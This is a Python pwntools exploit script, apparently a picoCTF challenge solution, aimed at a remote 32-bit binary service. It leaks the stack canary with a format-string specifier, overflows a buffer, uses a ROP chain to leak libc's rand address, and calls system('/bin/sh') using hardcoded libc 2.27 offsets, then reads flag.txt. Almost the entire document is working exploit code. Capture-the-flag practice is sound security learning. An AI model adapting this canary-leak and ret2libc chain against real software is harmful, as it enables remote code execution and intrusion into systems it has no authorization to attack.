from pwn import *
import re
context.terminal = ["termite","-e"]

elf = ELF("./vuln")

# p = elf.debug()
# p = elf.process()
p = remote("jupiter.challenges.picoctf.org", 15815)
p.recvuntil("guess?")

NUMBER = "-31"


WIN_EIP_OFFSET = 720

WIN_CANARY_OFFSET = 320



def leak_canary():
	p.sendline(NUMBER)

	p.recvuntil("Name?")
	p.sendline("%135$x")
	resp = p.recvline().decode()
	p.recvuntil("guess?")
	return int(re.search("Congrats: ([0-9a-fA-F]{8})", resp).group(1),16)

canary = leak_canary()
def send_rop(rop):
	p.recvuntil("Name?")
	payload = b"A" * 512 + p32(canary) + b"A" * 12 + rop
	p.sendline(payload)

def leak_symbol(sym):
	rop = ROP(elf)
	rop.puts(elf.symbols[sym])
	rop.win()
	send_rop(rop.chain())
	p.recvline()
	p.recvline()
	res = p.recvline()
	p.recvline()
	return u32(res[0:4])
p.sendline(NUMBER)
rand_sym = leak_symbol('rand')


# libc 2.32
# RAND_OFFSET = 0x39170
# SYSTEM_OFFSET = 0x456e0
# STR_BIN_SH_OFFSET = 0x195108
#libc 2.27
RAND_OFFSET = 0x30fe0
SYSTEM_OFFSET = 0x3cd80
STR_BIN_SH_OFFSET = 0x17bb8f
libc_base = rand_sym - RAND_OFFSET
system = libc_base + SYSTEM_OFFSET
binsh = libc_base + STR_BIN_SH_OFFSET
print("rand:", hex(rand_sym))
rop = ROP(elf)
rop.call(system, [binsh])
send_rop(rop.chain())

p.sendline("cat flag.txt;exit;")
print(re.search("(picoCTF{.*?})",p.recvall().decode()).group(1))